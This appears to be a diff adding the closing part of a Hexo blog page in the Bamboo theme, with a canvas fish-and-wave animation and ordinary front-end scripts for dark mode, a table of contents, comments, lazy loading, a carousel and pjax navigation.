+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2019 - 2020 <a target="_blank" rel="noopener" href="https://github.com/yuang01">yuang01</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+            <!-- 不蒜子统计 -->
+            <!-- 不蒜子统计 -->
+<span id="busuanzi_container_site_pv">
+      <i class="fas fa-eye" aria-hidden="true"></i>本站总访问量：<span id="busuanzi_value_site_pv"></span> 次
+</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+      <i class="fas fa-users" aria-hidden="true"></i>本站访客数：<span id="busuanzi_value_site_uv"></span> 人
+</span>
+
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark">
+  <div class="dark-content">
+    <i class="fas fa-moon" aria-hidden="true"></i>
+    <!-- <span>关灯</span> -->
+  </div>
+  
+</div>
+
+<script>
+  $(function() {
+    let isDark = JSON.parse(localStorage.getItem('dark'))  || JSON.parse('false');
+    if (isDark) {
+      $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+    }
+    $('.dark').click(function() {
+      if ($(document.body).is('.darkModel')) {
+        $(document.body).removeClass('darkModel');
+        localStorage.setItem('dark', false);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-moon" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      } else {
+        $(document.body).addClass('darkModel');
+        localStorage.setItem('dark', true);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      }
+    })
+  })
+</script>
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script> -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -70,
+    // headingsOffset: -($(window).height() * 0.4 - 45),
+    headingsOffset: -($(window).height() * 0.4 - 70),
+    // positionFixedSelector: '.toc-main',
+    // positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    orderedList: true,
+    collapseDepth: 20,
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 150) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  /* .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  } */
+</style>
+ 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const headerMenuTransparent = true;
+    if (!headerMenuTransparent) { return; }
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+    <script type="text/javascript">
+  var utteranceCommon = {};
+
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceCommon.Theme = 'github-dark';
+    } else {
+      utteranceCommon.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceCommon.Theme)
+      utterances.setAttribute('repo', '')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceCommon.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+   
+    <script src="/js/cursor/clicklove.js"></script> 
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+<!-- 轮播图标签 -->
+<script>
+  var bambooSwiperTag = {};
+  function load_swiper() {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
+    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      autoplay: true ? {
+        delay: 3000,
+        stopOnLastSlide: false,
+        disableOnInteraction: false,
+      } : false,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      on:{
+        init: function(){
+          swiperAnimateCache(this); //隐藏动画元素 
+          swiperAnimate(this); //初始化完成开始动画
+        }, 
+        slideChangeTransitionEnd: function(){ 
+          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
+        } 
+      }
+    });
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    if (typeof bambooSwiperTag.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
